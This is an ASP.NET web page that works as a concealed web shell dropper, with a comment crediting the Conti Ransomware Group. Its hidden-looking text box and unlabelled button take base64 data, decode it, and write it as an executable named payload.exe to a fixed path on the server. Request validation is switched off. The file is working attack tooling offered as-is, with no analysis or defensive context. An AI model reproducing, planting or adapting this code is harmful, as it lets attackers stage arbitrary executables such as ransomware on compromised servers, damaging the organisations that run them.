<%@ Page Language="C#" Debug="true" validateRequest="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
protected string ExchangeRuntime()
{
	return s.Text.ToString();
}
protected void C_Click(object sender, EventArgs e)
{
		Byte[] S = System.Convert.FromBase64String(ExchangeRuntime());
		string path = @"C:\Info\payload.exe";
        	// Delete the file if it exists.
        	if (File.Exists(path))
        	{
            	File.Delete(path);
        	}
        	//Create the file.
        	using (FileStream fs = File.Create(path))
        	using (MemoryStream m = new MemoryStream(S))
		{
		m.CopyTo(fs);
		}
}
</script>
<html>
<form id="form" runat="server" >
<asp:TextBox runat="server" ID="s" Value="" input style="border:0px"/>
<asp:Button ID="C" runat="server" Text="" OnClick="C_Click" />
</form>
</body>
</html>
<!-- Authors : Conti Ransomware Group ; Léo Giannardi -->
